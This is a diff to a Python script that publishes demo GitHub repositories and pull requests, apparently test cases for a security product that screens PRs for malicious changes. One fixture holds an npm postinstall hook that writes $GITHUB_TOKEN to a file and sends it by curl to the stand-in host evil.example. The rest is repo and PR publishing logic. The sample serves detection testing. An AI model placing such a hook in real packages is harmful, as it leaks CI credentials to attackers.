@@ -31,6 +31,7 @@ import tempfile
 from pathlib import Path
 
 ORG = "airlock-demo"
+REPO_ROOT = Path(__file__).resolve().parent.parent
 
 # (name, language, title, body, base_files, pr_files, fillers)
 # Base files give every repo an installable package with passing tests; pr_files land on
@@ -157,7 +158,7 @@ CASES: list[dict] = [
             "package.json": json.dumps({
                 "name": "npm-postinstall-exfil", "version": "0.2.0",
                 "scripts": {
-                    "postinstall": "echo \"token: $GITHUB_TOKEN\" && curl -s http://evil.example/?k=$GITHUB_TOKEN || true",
+                    "postinstall": "echo \"token: $GITHUB_TOKEN\" | tee /tmp/leaked-token.txt && curl -s http://evil.example/?k=$GITHUB_TOKEN || true",
                     "test": "node --test tests/",
                 },
             }, indent=2) + "\n",
@@ -375,7 +376,15 @@ def run(cmd: list[str], cwd: Path | None = None, check: bool = True) -> subproce
 
 
 def gh_json(args: list[str]) -> dict:
-    r = run(["gh", "api", *args])
+    # callers pass (repos, ORG, name, pulls, -X, POST, -f, k=v …) — gh wants the path as
+    # ONE argument, so join the leading path tokens before the first flag.
+    path: list[str] = []
+    for a in args:
+        if a.startswith("-"):
+            break
+        path.append(a)
+    joined = "/".join(path)
+    r = run(["gh", "api", joined, *args[len(path):]])
     return json.loads(r.stdout)
 
 
@@ -384,15 +393,55 @@ def repo_exists(name: str) -> bool:
     return r.returncode == 0
 
 
+def _get_pr(name: str, number: int) -> dict | None:
+    r = run(["gh", "api", f"repos/{ORG}/{name}/pulls/{number}"], check=False)
+    if r.returncode == 0:
+        try:
+            return json.loads(r.stdout)
+        except json.JSONDecodeError:
+            return None
+    return None
+
+
+def node_lockfile(package_json: str, workdir: Path) -> str | None:
+    """Generate a package-lock.json for the given package.json (npm ci needs it).
+    Returns None when npm is unavailable."""
+    workdir.mkdir(parents=True, exist_ok=True)
+    (workdir / "package.json").write_text(package_json)
+    r = run(["npm", "install", "--package-lock-only", "--ignore-scripts", "--no-audit", "--no-fund"],
+            cwd=workdir, check=False)
+    lock = workdir / "package-lock.json"
+    if r.returncode == 0 and lock.exists():
+        return lock.read_text()
+    return None
+
+
 def publish_case(case: dict, dry: bool = False) -> dict:
     name = case["name"]
     target_pr = int(case["pr_number"])
-    if repo_exists(name):
-        print(f"  = {name}: repo already exists, skipping")
-        return {"name": name, "url": f"https://github.com/{ORG}/{name}/pull/{target_pr}", "skipped": True}
+    exists = repo_exists(name)
+    if exists:
+        print(f"  ↻ {name}: repo exists — force-refreshing content (PRs keep their numbers)")
+    else:
+        print(f"  + {name}: creating")
 
     tmp = Path(tempfile.mkdtemp(prefix=f"airlock-demo-{name}-"))
     try:
+        # pipeline-compatible deps: python installs via requirements.txt, node via npm ci
+        if case["lang"] == "python":
+            case["base"].setdefault("requirements.txt", "-e .\n")
+            if case["pr"]:
+                case["pr"].setdefault("requirements.txt", "-e .\n")
+        else:
+            base_lock = node_lockfile(case["base"]["package.json"], tmp / "_lock_base")
+            if base_lock:
+                case["base"]["package-lock.json"] = base_lock
+            pr_pkg = case["pr"].get("package.json")
+            if pr_pkg:
+                pr_lock = node_lockfile(pr_pkg, tmp / "_lock_pr")
+                if pr_lock:
+                    case["pr"]["package-lock.json"] = pr_lock
+
         run(["git", "init", "-b", "main", "."], cwd=tmp)
         for path, content in case["base"].items():
             f = tmp / path
@@ -404,8 +453,9 @@ def publish_case(case: dict, dry: bool = False) -> dict:
         run(["git", "remote", "add", "origin", f"https://github.com/{ORG}/{name}.git"], cwd=tmp)
         run(["gh", "auth", "setup-git"], cwd=tmp)
         if not dry:
-            run(["gh", "repo", "create", f"{ORG}/{name}", "--public"], cwd=tmp)
-            run(["git", "push", "-q", "origin", "main"], cwd=tmp)
+            if not exists:
+                run(["gh", "repo", "create", f"{ORG}/{name}", "--public"], cwd=tmp)
+            run(["git", "push", "-q", "--force", "origin", "main"], cwd=tmp)
 
         # PR branch
         run(["git", "checkout", "-q", "-b", "pr"], cwd=tmp)
@@ -420,30 +470,35 @@ def publish_case(case: dict, dry: bool = False) -> dict:
         run(["git", "-c", "user.name=airlock-demo", "-c", "user.email=demo@airlock.local",
              "commit", "-q", "-m", case["title"]], cwd=tmp)
         if not dry:
-            run(["git", "push", "-q", "origin", "pr"], cwd=tmp)
-
-        # filler PRs consume numbers so the real PR lands on the exact number the
-        # product links to (cases.yaml / demo buttons)
-        for i in range(case["fillers"]):
-            run(["git", "checkout", "-q", "-b", f"filler-{i}", "main"], cwd=tmp)
-            (tmp / "FILLER.md").write_text(f"placeholder {i}\n")
-            run(["git", "add", "-A"], cwd=tmp)
-            run(["git", "-c", "user.name=airlock-demo", "-c", "user.email=demo@airlock.local",
-                 "commit", "-q", "-m", f"placeholder {i}"], cwd=tmp)
-            if not dry:
-                run(["git", "push", "-q", "origin", f"filler-{i}"], cwd=tmp)
-                gh_json(["repos", ORG, name, "pulls", "-X", "POST",
-                         "-f", f"title=placeholder {i}", "-f", "head=filler-" + str(i),
-                         "-f", "base=main"])
-                gh_json(["repos", ORG, name, "pulls", str(target_pr - case["fillers"] + i),
-                         "-X", "PATCH", "-F", "state=closed"])
+            run(["git", "push", "-q", "--force", "origin", "pr"], cwd=tmp)
 
         if not dry:
-            gh_json(["repos", ORG, name, "pulls", "-X", "POST",
-                     "-f", f"title={case['title']}", "-f", "head=pr", "-f", "base=main",
-                     "-F", f"body={case['body']}"])
+            # fillers only on first publish (they hold the PR numbers in place)
+            if not exists:
+                for i in range(case["fillers"]):
+                    run(["git", "checkout", "-q", "-b", f"filler-{i}", "main"], cwd=tmp)
+                    (tmp / "FILLER.md").write_text(f"placeholder {i}\n")
+                    run(["git", "add", "-A"], cwd=tmp)
+                    run(["git", "-c", "user.name=airlock-demo", "-c", "user.email=demo@airlock.local",
+                         "commit", "-q", "-m", f"placeholder {i}"], cwd=tmp)
+                    run(["git", "push", "-q", "origin", f"filler-{i}"], cwd=tmp)
+                    gh_json(["repos", ORG, name, "pulls", "-X", "POST",
+                             "-f", f"title=placeholder {i}", "-f", "head=filler-" + str(i),
+                             "-f", "base=main"])
+                    gh_json(["repos", ORG, name, "pulls", str(target_pr - case["fillers"] + i),
+                             "-X", "PATCH", "-F", "state=closed"])
+
+            # the real PR: create on first publish, update body/title on refresh
+            pr = _get_pr(name, target_pr)
+            if pr is None:
+                gh_json(["repos", ORG, name, "pulls", "-X", "POST",
+                         "-f", f"title={case['title']}", "-f", "head=pr", "-f", "base=main",
+                         "-F", f"body={case['body']}"])
+            else:
+                gh_json(["repos", ORG, name, "pulls", str(target_pr), "-X", "PATCH",
+                         "-f", f"title={case['title']}", "-F", f"body={case['body']}"])
         url = f"https://github.com/{ORG}/{name}/pull/{target_pr}"
-        print(f"  + {name}: {url}")
+        print(f"  ✓ {name}: {url}")
         return {"name": name, "url": url, "skipped": False}
     finally:
         run(["rm", "-rf", str(tmp)], cwd=Path("/tmp"))
@@ -458,11 +513,23 @@ def main() -> None:
     args = ap.parse_args()
     ORG = args.org
 
-    # org must exist
+    # target must exist and be writable (user account or org)
     if not args.dry_run:
-        r = run(["gh", "api", f"orgs/{ORG}"], check=False)
-        if r.returncode != 0:
-            sys.exit(f"org {ORG} does not exist (or gh lacks access) — create it first")
+        ok = run(["gh", "api", f"users/{ORG}"], check=False).returncode == 0 or run(
+            ["gh", "api", f"orgs/{ORG}"], check=False
+        ).returncode == 0
+        if not ok:
+            sys.exit(f"target {ORG} does not exist (or gh lacks access)")
+
+    # PR numbers come straight from the product's own case list so the demo targets
+    # and the publisher can never drift apart.
+    import re as _re
+    yaml_text = (REPO_ROOT / "eval_cases" / "cases.yaml").read_text()
+    pr_numbers: dict[str, int] = {}
+    for m in _re.finditer(r"name:\s*([\w-]+),\s*url:\s*\"[^\"]*/pull/(\d+)\"", yaml_text):
+        pr_numbers[m.group(1)] = int(m.group(2))
+    for c in CASES:
+        c["pr_number"] = pr_numbers[c["name"]]
 
     selected = [c for c in CASES if not args.only or c["name"] in args.only]
     results = []
